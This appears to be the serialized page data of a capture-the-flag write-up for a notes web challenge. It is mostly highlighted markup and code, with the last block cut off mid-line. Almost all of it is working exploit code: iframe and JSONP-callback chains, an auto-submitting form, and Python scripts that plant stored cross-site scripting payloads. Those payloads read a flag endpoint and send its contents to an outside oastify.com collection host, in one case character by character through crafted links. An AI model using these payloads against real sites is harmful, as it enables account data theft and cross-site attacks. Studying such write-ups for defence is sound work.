class=\"token function\"\u003esetTimeout\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eresolve\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e ms\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003easync\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eawait\u003c/span\u003e \u003cspan class=\"token function\"\u003esleep\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e5000\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e iframe2 \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e document\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ecreateElement\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"iframe\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        iframe2\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esrc \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        document\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ebody\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eappendChild\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eiframe2\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n        \u003cspan class=\"token keyword\"\u003eawait\u003c/span\u003e \u003cspan class=\"token function\"\u003esleep\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e1000\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e iframe3 \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e document\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ecreateElement\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"iframe\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        iframe3\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esrc \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"{{target}}/note/{{note_id}}%3fcallback=top.frames[0].showNote%23\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        document\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ebody\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eappendChild\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eiframe3\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"25:T17e3,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token doctype\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;!\u003c/span\u003e\u003cspan class=\"token doctype-tag\"\u003eDOCTYPE\u003c/span\u003e \u003cspan class=\"token name\"\u003ehtml\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ehtml\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003elang\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003een\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ehead\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003etitle\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003eExploit\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003etitle\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ehead\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ebody\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003eiframe\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003esrcdoc\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\n    \u0026lt;form method='POST' action='{{target}}/view.js'\u003e\n    \u0026lt;script\u003e\n        document.forms[0].submit();\n    \u0026lt;/script\u003e\n\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003eiframe\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token script\"\u003e\u003cspan class=\"token language-javascript\"\u003e\n    \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"token function-variable function\"\u003esleep\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003ems\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"token class-name\"\u003ePromise\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003eresolve\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token function\"\u003esetTimeout\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eresolve\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e ms\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003easync\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eawait\u003c/span\u003e \u003cspan class=\"token function\"\u003esleep\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e5000\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e iframe2 \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e document\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ecreateElement\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"iframe\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        iframe2\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esrc \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        document\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ebody\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eappendChild\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eiframe2\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n        \u003cspan class=\"token keyword\"\u003eawait\u003c/span\u003e \u003cspan class=\"token function\"\u003esleep\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e1000\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e iframe3 \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e document\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ecreateElement\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"iframe\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        iframe3\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esrc \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"{{target}}/note/{{note_id}}%3fcallback=top.frames[0].showNote%23\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        document\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ebody\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eappendChild\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eiframe3\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ebody\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ehtml\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"26:Tc35,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003efrom\u003c/span\u003e flask \u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e Flask\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e render_template\n\u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e requests\n\ntarget \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"https://jnotes-web.chal.idek.team\"\u003c/span\u003e\n\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token triple-quoted-string string\"\u003e\"\"\"\u0026lt;img src=x onerror='\n    const sleep = (ms) =\u003e new Promise(resolve =\u003e setTimeout(resolve, ms));\n    const tab = window.open(`/api/flag`);\n    sleep(3000).then(() =\u003e fetch(\"//ta7dkoi5sodij8u1k6eft29ybphg56tv.oastify.com/?flag=\" + tab.document.body.innerText));\n'\u003e\"\"\"\u003c/span\u003e\n\nresp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e requests\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003epost\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003etarget \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"/api/post\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e json\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"noteContent\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"noteTitle\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"anything\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nnote_id \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e resp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ejson\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"id\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003enote_id\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\napp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e Flask\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e__name__\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e template_folder\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token string\"\u003e\".\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\n\u003cspan class=\"token decorator annotation punctuation\"\u003e@app\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eroute\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"/\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003eindex\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e render_template\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"index.html\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e target\u003cspan class=\"token operator\"\u003e=\u003c/span\u003etarget\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e note_id\u003cspan class=\"token operator\"\u003e=\u003c/span\u003enote_id\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\napp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erun\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"0.0.0.0\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e5003\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"27:T8ac,"])</script><script>self.__next_f.push([1,"i \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token number\"\u003e9\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# {\"flag\":\"idek{...}\"}\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e#          ^\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e#         i=9\u003c/span\u003e\n\nanchors \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ejoin\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\n    \u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef'\u0026lt;a id=\"\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ech\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e\" href=\"//caqwk7ios7d1jrukkpeytl9hb8hz5sth.oastify.com/?flag_\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ei \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e9\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e=\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ech\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e\" target=\"_blank\"\u003e\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ech\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e\u0026lt;/a\u003e'\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e ch \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}\"\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef\"\"\"\n    \u0026lt;iframe srcdoc='\n        \u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003eanchors\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e\n        \u0026lt;script src=\"/api/view/anything?callback=window[top.opener.document.body.innerText[\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ei\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e]].click\"\u003e\u0026lt;/script\u003e\n    '\u003e\u0026lt;/iframe\u003e\n\"\"\"\u003c/span\u003e\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"28:T9b4,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token doctype\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;!\u003c/span\u003e\u003cspan class=\"token doctype-tag\"\u003eDOCTYPE\u003c/span\u003e \u003cspan class=\"token name\"\u003ehtml\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ehtml\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003elang\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003een\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ehead\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003etitle\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003eExploit\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003etitle\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ehead\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ebody\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token script\"\u003e\u003cspan class=\"token language-javascript\"\u003e\n    window\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eopen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"{{target}}/note/{{note_id}}\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    location\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ehref \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"{{target}}/api/flag\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ebody\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ehtml\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"29:T12cc,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003efrom\u003c/span\u003e flask \u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e Flask\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e render_template\n\u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e requests\n\ntarget \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"https://jnotes-web.chal.idek.team\"\u003c/span\u003e\n\ni \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token number\"\u003e9\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# {\"flag\":\"idek{...}\"}\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e#          ^\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e#         i=9\u003c/span\u003e\n\nanchors \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \"\n\n    \u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef'\u0026lt;a id=\"\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ech\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e\" href=\"//caqwk7ios7d1jrukkpeytl9hb8hz5sth.oastify.com/?flag_\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ei \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e9\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e=\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ech\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e\" target=\"_blank\"\u003e\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ech\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e\u0026lt;/a\u003e'\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e ch \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"token 